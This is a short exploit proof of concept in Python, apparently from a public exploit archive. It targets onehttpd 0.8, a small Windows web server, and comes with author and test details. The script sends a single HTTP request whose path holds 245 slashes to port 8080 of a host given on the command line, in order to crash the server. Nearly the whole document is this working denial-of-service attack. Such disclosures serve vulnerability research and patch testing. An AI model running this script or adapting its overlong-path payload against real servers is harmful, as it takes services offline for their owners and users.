# Exploit Title: onehttpd 0.8 Crash PoC
# Date: Feb 7,2014
# Exploit Author: Mahmod Mahajna (Mahy)
# Version: 0.8
# Software Link: https://onehttpd.googlecode.com/files/onehttpd-0.8.exe
# Tested on: Windows XP SP3
# Email: m.dofo123@gmail.com
from requests import get,ConnectionError as cerror
from sys import argv
if(len(argv)!=2):
  print '%s host' % argv[0]
else:
  buff = '/'*245
  script,host=argv
  try:
    get('http://'+host+':8080/'+buff)
  except cerror:
    exit(1)